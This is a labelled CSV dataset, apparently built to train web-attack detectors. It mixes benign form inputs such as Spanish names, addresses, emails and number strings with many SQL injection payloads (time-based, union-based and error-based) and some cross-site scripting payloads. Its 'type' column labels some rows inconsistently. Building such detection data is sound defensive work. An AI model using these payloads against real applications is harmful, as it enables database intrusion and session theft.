Text,attack_type,Label,type
"1%')) and elt(3114=3114,sleep(5))#",sqli,1,normal
0512154682216503,norm,0,normal
chipiona,norm,0,normal
"1%""))) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
1527409541807001,norm,0,normal
"1%'))) and elt(3114=3114,sleep(5))#",sqli,1,normal
7stambrar,norm,0,normal
leopolda,norm,0,normal
de5peadura,norm,0,normal
9636562879352994,norm,0,normal
59388065h,norm,0,normal
"1) where 1193=1193 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
madrid,norm,0,normal
"-1949"")) as urke where 8761=8761 union all select 8761,8761,8761,8761,8761,8761,8761#",sqli,1,sql
"-8655) where 3910=3910 union all select 3910,3910#",sqli,1,sql
kellogg@viajesinternacionales.ne,norm,0,normal
revacunacin,norm,0,normal
"1"")) as isqj where 6344=6344 union all select null,null,null,null--",sqli,1,sql
yee,norm,0,normal
-2790')) or 8571=8571--,sqli,1,sql
pelle1@906.com.aq,norm,0,normal
"1' in boolean mode);call regexp_substring(repeat(right(char(3702),0),500000000),null)#",sqli,1,sql
"1'));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1"") as vcir where 6275=6275 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
-5020%') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',sqli,1,sql
nilsson,norm,0,normal
rojales,norm,0,normal
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('yiem'='yiem",sqli,1,sql
badajoz,norm,0,normal
marling,norm,0,normal
49618,norm,0,normal
levisky,norm,0,normal
09247,norm,0,normal
pawley@santacruzdelvoto.vu,norm,0,normal
"1"") where 6679=6679 rlike sleep(5)#",sqli,1,normal
651,norm,0,normal
ex1*av2936a,norm,0,normal
barro,norm,0,normal
pro8i2ic6r,norm,0,normal
lesmeris,norm,0,normal
mackenna.papac@interpretacion-diccionario-y-significado-de-los-s,norm,0,normal
1'))) or sleep(5) and ((('wuwv'='wuwv,sqli,1,normal
kirkley9,norm,0,normal
4364,norm,0,normal
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
indis6r4cin,norm,0,normal
addie@logiteclines.zm,norm,0,normal
silvie,norm,0,normal
hall,norm,0,normal
1) and 3659=5475 and (8949=8949,sqli,1,normal
027eja,norm,0,normal
"1'+(select 'ples' where 4244=4244 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",sqli,1,sql
37200229y,norm,0,normal
"1"")) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""ulfr"" like ""ulfr",sqli,1,sql
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
listeza,norm,0,normal
"1"")) as dooq where 7911=7911;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",sqli,1,sql
"vendrell, el",norm,0,normal
asia,norm,0,normal
nevel,norm,0,normal
grin,norm,0,normal
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)-- kfqs",sqli,1,sql
339403r90am958e,norm,0,normal
preordinar,norm,0,normal
moll@eurograb.ic,norm,0,normal
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",xss,2,sql
patenaud,norm,0,normal
5408,norm,0,normal
alceo,norm,0,normal
t45r97car,norm,0,normal
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme",sqli,1,sql
9122440516217949,norm,0,normal
ketley,norm,0,normal
novelador,norm,0,normal
5973549282567233,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
46714,norm,0,normal
collado villalba,norm,0,normal
"plaza de la sevillana, 81, 5-e",norm,0,normal
poblacin de arroyo,norm,0,normal
mcnerlan,norm,0,normal
armijo,norm,0,normal
a089ar,norm,0,normal
sanguino terreno,norm,0,normal
gabarrot,norm,0,normal
06660,norm,0,normal
"1')) as popm where 6594=6594 union all select null,null#",sqli,1,sql
m974or5s2,norm,0,normal
mndez testua,norm,0,normal
24768,norm,0,normal
epps6,norm,0,normal
"<img src=""livescript:[code]"">",xss,2,normal
di9l,norm,0,normal
vilanova de arousa,norm,0,normal
limongi diguez,norm,0,normal
57317186j,norm,0,normal
57738017j,norm,0,normal
"-7142')) union all select 5083,5083,5083,5083#",sqli,1,sql
chimenea,norm,0,normal
"-7764"" or 7308=7805",sqli,1,normal
"1' and elt(3114=3114,sleep(5))#",sqli,1,normal
gelis,norm,0,normal
brando@elsentidodelavida.lc,norm,0,normal
973,norm,0,normal
n4que,norm,0,normal
averell9,norm,0,normal
12354547m,norm,0,normal
18269491q,norm,0,normal
gallart cocm,norm,0,normal
bolduc,norm,0,normal
lyndal,norm,0,normal
"1) and make_set(4593=7765,7765) and (8517=8517",sqli,1,normal
"-2909'||(select 'qfeq' where 7062=7062 union all select 7062,7062,7062,7062,7062,7062--",sqli,1,sql
vincenzi1@saavedradiaz.tc,norm,0,normal
"1) where 5012=5012 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
9834,norm,0,normal
altares pellizza,norm,0,normal
hormilleja,norm,0,normal
"1) where 7026=7026;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"calle santa pola, 7",norm,0,normal
pellicer,norm,0,normal
acaudalador,norm,0,normal
8331341352065092,norm,0,normal
romanones,norm,0,normal
velilla de san antonio,norm,0,normal
3586735536952135,norm,0,normal
xiangsen,norm,0,normal
1626,norm,0,normal
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw",sqli,1,sql
sebastian_ferdi@tintaultravioleta.mv,norm,0,normal
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",sqli,1,sql
"-7088'||(select 'arol' from dual where 8891=8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",sqli,1,sql
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
s4pe9iorm9n8e,norm,0,normal
"1')) as lkse where 9951=9951;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"victoria, la",norm,0,normal
pl. heroes de espaa 20 11?g,norm,0,normal
1') where 3187=3187 order by 1#,sqli,1,normal
marketa,norm,0,normal
"<base href=""javascript:alert('xss');//"">",xss,2,xss
pilotaje,norm,0,normal
"-2948')) or make_set(9354=9354,7185) and (('ivwt'='ivwt",sqli,1,normal
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",sqli,1,sql
96558759k,norm,0,normal
07160844r,norm,0,normal
seiter.segev@mataluenga.bs,norm,0,normal
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((8535=8535",sqli,1,sql
aira vials,norm,0,normal
1%') or sleep(5) and ('%'=',sqli,1,normal
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
0246690614310406,norm,0,normal
"1)) as nnpe where 9720=9720 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
2533839429419532,norm,0,normal
olite,norm,0,normal
t45o0a35,norm,0,normal
"1 and elt(2770=3669,3669)# sfls",sqli,1,normal
5h5c8,norm,0,normal
barnechea,norm,0,normal
eflujo,norm,0,normal
2399,norm,0,normal
"travesia olmos, s/n 12e",norm,0,normal
"1'||(select 'yrau' where 7860=7860 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",sqli,1,sql
"1'||(select 'xuof' from dual where 8794=8794 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
06370,norm,0,normal
dalmiro,norm,0,normal
1%')) waitfor delay '0:0:5'--,sqli,1,sql
caada del hoyo,norm,0,normal
0h5rrad0,norm,0,normal
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1'))) union all select null,null,null#",sqli,1,sql
leonard,norm,0,normal
kastner.matsuzaka@graficascamp.py,norm,0,normal
castellgal,norm,0,normal
godall,norm,0,normal
c594h6e5,norm,0,normal
"1""));select (case when (3499=4209) then 3499 else 3499*(select 3499 from mysql.db) end)#",sqli,1,sql
c6he5era,norm,0,normal
spiegel-haake@convention.no,norm,0,normal
"calle muelles 57, 10?d",norm,0,normal
wilson@autoconstruccion.fi,norm,0,normal
"1"") where 7514=7514;select case when 7717=7717 then 1 else null end--",sqli,1,sql
86979759s,norm,0,normal
cortie,norm,0,normal
pearcy@b-sign.mz,norm,0,normal
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1973457393131031,norm,0,normal
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
7ri87at0,norm,0,normal
"los giles 99, 1?a",norm,0,normal
49697,norm,0,normal
1);waitfor delay '0:0:5' and (4614=4614,sqli,1,sql
66,norm,0,normal
iafrate ciavaglia,norm,0,normal
s!oap,norm,0,normal
"-3632' or make_set(9354=9354,7185) and 'lgpy' like 'lgpy",sqli,1,normal
bu9ero,norm,0,normal
1'))) or sleep(5) and ((('bmnf' like 'bmnf,sqli,1,normal
1')) as hxxm where 3792=3792 and sleep(5)#,sqli,1,normal
1%')) and 3721=2597#,sqli,1,normal
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",sqli,1,sql
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
7652411292713718,norm,0,normal
39499084b,norm,0,normal
15885803w,norm,0,normal
31270,norm,0,normal
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- mtaq",sqli,1,sql
964,norm,0,normal
">""<table><td background=""javascript:document.cookie=true;"">",xss,2,xss
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
1'));select (case when (7385=8723) then 7385 else 7385*(select 7385 from information_schema.character_sets) end)#,sqli,1,sql
a5aranjada,norm,0,normal
jerez brecha,norm,0,normal
1')) rlike sleep(5)#,sqli,1,normal
"1%""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
6670024896403419,norm,0,normal
1')));select case when 3819=1887 then 1 else null end--,sqli,1,sql
gueslaz,norm,0,normal
valvular,norm,0,normal
2420,norm,0,normal
4774034057366562,norm,0,normal
estropeo,norm,0,normal
1') or (select * from (select(sleep(5)))ydpu) and ('dqoz' like 'dqoz,sqli,1,sql
69346006v,norm,0,normal
othella,norm,0,normal
"emilio arrieta, 110, 1f",norm,0,normal
fortuny goyenaga,norm,0,normal
4273115908926926,norm,0,normal
sathe9,norm,0,normal
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",sqli,1,sql
"1%'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
javascript:alert(1)//,xss,2,xss
lucila2,norm,0,normal
d3s7ota5,norm,0,normal
07608453f,norm,0,normal
arenys de mar,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
se1i81me885,norm,0,normal
8624528544448425,norm,0,normal
diffee,norm,0,normal
"1'||(select 'gwxc' from dual where 3626=3626 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
h8ber,norm,0,normal
"1"")));if(8727=4039) select 8727 else drop function giql--",sqli,1,sql
35194800q,norm,0,normal
2569,norm,0,normal
philipa,norm,0,normal
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# cgow",sqli,1,sql
80,norm,0,normal
81878772z,norm,0,normal
">""<div style=""behaviour: url([link to code]);"">",xss,2,sql
"c/ misericordia, 57 7-h",norm,0,normal
"-2167'))) union all select 3804,3804,3804,3804,3804,3804#",sqli,1,sql
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",sqli,1,sql
46821,norm,0,normal
sant pau de segries,norm,0,normal
irrumpir,norm,0,normal
96277205x,norm,0,normal
"1')) and elt(4249=4249,7259) and (('oucg'='oucg",sqli,1,normal
1);(select * from (select(sleep(5)))srmq),sqli,1,sql
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
hanzlice,norm,0,normal
7840,norm,0,normal
13061311w,norm,0,normal
-4219' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
atos,norm,0,normal
"1"";begin user_lock.sleep(5); end--",sqli,1,sql
alazana,norm,0,normal
"1"")) as ycvh where 4523=4523 and sleep(5)#",sqli,1,normal
wincott_remeck@enformetera.com.sc,norm,0,normal
"1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
"-2197' union all select 8065,8065,8065,8065--",sqli,1,sql
prullans,norm,0,normal
35126766q,norm,0,normal
neusy,norm,0,normal
raddalgo,norm,0,normal
1764760587372326,norm,0,normal
"-3420 where 9681=9681 or make_set(2438=1977,1977)--",sqli,1,sql
"1' in boolean mode) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)#",sqli,1,sql
"1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",sqli,1,normal
13600,norm,0,normal
sandler,norm,0,normal
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('gfln'='gfln",sqli,1,sql
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cogf' like 'cogf",sqli,1,normal
77974019v,norm,0,normal
mccollum,norm,0,normal
1'+(select ejaj where 1651=1651 or 6793=(select 6793 from pg_sleep(5)))+',sqli,1,sql
6015,norm,0,normal
25960678a,norm,0,normal
soslaya,norm,0,normal
-9721') or 9287=4362#,sqli,1,normal
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)# yrpn",sqli,1,sql
shazmin,norm,0,normal
3654394570755468,norm,0,normal
">""scriptdocument.cookie=true;/script",xss,2,sql
"1%""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""%""=""",sqli,1,normal
041!da2131434e,norm,0,normal
"paseo constitucion, 10,",norm,0,normal
1'+(select ophz where 9158=9158 rlike (select * from (select(sleep(5)))sgvo))+',sqli,1,sql
18670,norm,0,normal
"carrer joan berenguer, 38,",norm,0,normal
"1'+(select oogh where 1167=1167 or elt(5873=5873,sleep(5))#",sqli,1,sql
"<frameset><frame id=xss src=""javascript:alert('xss');""></frameset>",xss,2,xss
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",sqli,1,sql
passatge de manyer 105,norm,0,normal
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",sqli,1,sql
"1"" where 4281=4281;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
nolberto,norm,0,normal
26150430m,norm,0,normal
gabey,norm,0,normal
basco,norm,0,normal
franka,norm,0,normal
drane,norm,0,normal
9478,norm,0,normal
8993572479681564,norm,0,normal
"-8098%') union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",sqli,1,sql
moel,norm,0,normal
derio,norm,0,normal
aracena,norm,0,normal
-9355' or (8459=8459)*4906 and 'aegf'='aegf,sqli,1,normal
"c/ sorbona, 124 12-f",norm,0,normal
"-7876%') union all select 3909,3909,3909,3909,3909#",sqli,1,sql
benicolet,norm,0,normal
norma,norm,0,normal
5071457093229658,norm,0,normal
mc'morral obrist,norm,0,normal
duda,norm,0,normal
"1%"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",sqli,1,sql
31013,norm,0,normal
3349,norm,0,normal
glucksma,norm,0,normal
kellard@todobetis.gf,norm,0,normal
1');begin dbms_lock.sleep(5); end,sqli,1,sql
"c/ la estrella, 182",norm,0,normal
-7775 or 8571=8571--,sqli,1,sql
"altos de lillo, 137",norm,0,normal
siu-kwok,norm,0,normal
"1"" union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"benito perez galdos, 62,",norm,0,normal
runfla0te,norm,0,normal
"-1<img src=""blah>"" onmouseover=""document.cookie=true;"">",xss,2,sql
1') as llug where 2244=2244 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1')) as qcgf where 9656=9656 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
116,norm,0,normal
manzanilla,norm,0,normal
"calle romeral, 143, 7?h",norm,0,normal
elsie,norm,0,normal
"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",sqli,1,sql
matula,norm,0,normal
ezcurra lo cascio,norm,0,normal
"1'+(select wpai where 3685=3685;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
0894971274673122,norm,0,normal
1)) as fpej where 6790=6790 and (3020=3020)*6703--,sqli,1,sql
"-6436' in boolean mode) union all select 7589,7589,7589,7589--",sqli,1,sql
sant carles de la rpita,norm,0,normal
ron,norm,0,normal
"calle hospital, 68",norm,0,normal
em8o0a2,norm,0,normal
08298,norm,0,normal
"1%""))) union all select null,null,null,null,null,null--",sqli,1,sql
knyht9@aspirantes.lt,norm,0,normal
manducatoria,norm,0,normal
carola,norm,0,normal
9516,norm,0,normal
moreras sort,norm,0,normal
solter@aclub.com.ke,norm,0,normal
"1);iif(5257=5257,1,1/0)",sqli,1,sql
34791026f,norm,0,normal
ua de quintana,norm,0,normal
7aria22,norm,0,normal
gimialcn,norm,0,normal
2925,norm,0,normal
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",sqli,1,normal
valadao@salaparis.ls,norm,0,normal
55687401p,norm,0,normal
2389465046148028,norm,0,normal
alor,norm,0,normal
2626,norm,0,normal
peek@clubforex.ax,norm,0,normal
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
nakadai_newell@intercambioenlaces.tn,norm,0,normal
ajorca,norm,0,normal
jamn ibrico,norm,0,normal
4856355827488327,norm,0,normal
naca39,norm,0,normal
plumero,norm,0,normal
35200,norm,0,normal
santaren,norm,0,normal
7315,norm,0,normal
"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",sqli,1,sql
sangborivutr@ssextremadura.gr,norm,0,normal
"plza. luis cernuda, 88",norm,0,normal
"1' union all select null,null,null--",sqli,1,sql
"catalanes, 137, 3?a",norm,0,normal
a9m7dr83a,norm,0,normal
fuenteheridos 129,norm,0,normal
pakulski,norm,0,normal
"1%');select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'cipk'='cipk",sqli,1,sql
montesano_wontner@pcvirus.tm,norm,0,normal
e7tearina,norm,0,normal
s093li8n7,norm,0,normal
millana,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
po29ip1t0l6,norm,0,normal
favio_zakin@so-tel.cl,norm,0,normal
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">",xss,2,xss
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""menm"" like ""menm",sqli,1,normal
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('cimm' like 'cimm",sqli,1,normal
gonzaga ripalda,norm,0,normal
6239536280691962,norm,0,normal
90907663w,norm,0,normal
alvean,norm,0,normal
rafael,norm,0,normal
20115,norm,0,normal
28867747x,norm,0,normal
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",sqli,1,sql
19141,norm,0,normal
macedonio,norm,0,normal
"1"" where 8571=8571;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
molinos de duero,norm,0,normal
c/ cofa 39,norm,0,normal
tuneu,norm,0,normal
"1""))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
6ait1na89,norm,0,normal
cianneli@connect.pg,norm,0,normal
"-6636'))) or elt(1032=1032,3623) and ((('kgip'='kgip",sqli,1,normal
u+6711n,norm,0,normal
walker@ebaz.vi,norm,0,normal
"1') or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,sql
"c/ doctor santero, 126 6-g",norm,0,normal
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,sqli,1,sql
22010612a,norm,0,normal
aforismo,norm,0,normal
6225,norm,0,normal
yong-gomori@andrestabernero.gg,norm,0,normal
christlein-johanna6@cup-ido.hn,norm,0,normal
"1',(select (case when (2073=5314) then 1 else 1/(select 0) end))",sqli,1,sql
1' and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
4761547357229973,norm,0,normal
-8187'))) or 1698=2823#,sqli,1,normal
"1%"")) or sleep(5)#",sqli,1,normal
45789,norm,0,normal
"1 union all select null,null,null,null,null,null,null#",sqli,1,sql
tarasova_dabo@comerciosdeaspe.ly,norm,0,normal
marrupe,norm,0,normal
6135978760612674,norm,0,normal
masaguer pardinas,norm,0,normal
-2291)) or 4067=5666#,sqli,1,normal
gracindo@ajuntamentbcn2-0.jp,norm,0,normal
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",sqli,1,sql
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",sqli,1,sql
4183,norm,0,normal
1998,norm,0,normal
"1')) as fusi where 2788=2788 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
samanta,norm,0,normal
"1)) as avdz where 1881=1881 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('ztmd'='ztmd",sqli,1,sql
"-4535') union all select 8491,8491,8491,8491,8491,8491--",sqli,1,sql
"1"") as uyms where 6210=6210 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
calle ulises s/n 11d,norm,0,normal
stratten,norm,0,normal
42569506w,norm,0,normal
mattos@velazquezlarraaga.dd,norm,0,normal
dicaprio,norm,0,normal
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
1%'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('%'=',sqli,1,sql
"1%') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",sqli,1,normal
parolero,norm,0,normal
fal429a,norm,0,normal
"1')) union all select null,null,null,null,null,null--",sqli,1,sql
jordi,norm,0,normal
onofre,norm,0,normal
"portal de betoo, 148,",norm,0,normal
9usta4ui6,norm,0,normal
91436910l,norm,0,normal
"-3137'||(select 'btif' where 1718=1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",sqli,1,sql
"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded",sqli,1,normal
"1'))) or elt(5873=5873,sleep(5))#",sqli,1,normal
61527078p,norm,0,normal
yamuza ezama,norm,0,normal
in4o75u1t4!bili0a1,norm,0,normal
abbot,norm,0,normal
antigua,norm,0,normal
"c/ pedro ortiz, 128",norm,0,normal
4999320970641134,norm,0,normal
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
88426780z,norm,0,normal
1);select pg_sleep(5),sqli,1,sql
wei-tsig8,norm,0,normal
48c09a,norm,0,normal
"aguila s/n, 6-g",norm,0,normal
""",,,,,x"" onerror=""alert(1)"">",xss,2,xss
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",sqli,1,sql
niembro urkiaga,norm,0,normal
"calle carcedo, 197,",norm,0,normal
49650,norm,0,normal
nerti,norm,0,normal
praxila,norm,0,normal
6019,norm,0,normal
9820me5a,norm,0,normal
crista,norm,0,normal
r8u9c5,norm,0,normal
14602519a,norm,0,normal
qunola,norm,0,normal
verbosidad,norm,0,normal
5761,norm,0,normal
"arevalo, 170,",norm,0,normal
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('adjc'='adjc",sqli,1,normal
7699839843015936,norm,0,normal
"-3279"" union all select 8568,8568,8568,8568--",sqli,1,sql
4470,norm,0,normal
pamina,norm,0,normal
19432,norm,0,normal
"1) where 1270=1270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
04420,norm,0,normal
0854278659322549,norm,0,normal
canut escriba,norm,0,normal
"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
